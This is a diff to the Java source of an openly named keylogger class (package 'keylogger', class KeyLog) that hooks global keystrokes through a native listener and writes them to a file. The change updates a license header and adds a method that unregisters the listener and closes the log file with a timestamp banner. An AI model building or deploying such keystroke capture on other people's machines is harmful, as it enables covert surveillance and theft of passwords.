@@ -1,4 +1,4 @@
-/**
+/*
  *
  * =========================================================================================
  *  Copyright (C) 2019-2020
@@ -7,7 +7,7 @@
  * =========================================================================================
  *
  * You should have received a copy of the license with this file.
- * If not, please write to: info@am-design-development.com, or visit : ${project.main.url}
+ * If not, please write to: info@am-design-development.com, or visit : https://www.am-design-development.com/
  */
 package keylogger;
 
@@ -64,6 +64,21 @@ public class KeyLog implements NativeKeyListener{
 //		}
 		 GlobalScreen.addNativeKeyListener(this);
 		 System.out.println("Started :)");
+	}
+	
+	public void releaseResources() {
+		try {
+			GlobalScreen.removeNativeKeyListener(this);
+			SimpleDateFormat df = new SimpleDateFormat("dd_MM_YYYY_@HH:mm:ss");
+			String msg = "\n#######################################################################\n -> CLOSING LOGGER "+df.format(new Date())+" \n#######################################################################\n\n ";
+			fileOutStream.write(msg);
+			
+			fileOutStream.flush();
+			fileOutStream.close();
+		}catch (Exception e) {
+			System.out.println("Error closing file stream");
+			e.printStackTrace();
+		}
 	}
 
 	public void nativeKeyPressed(NativeKeyEvent arg0) {
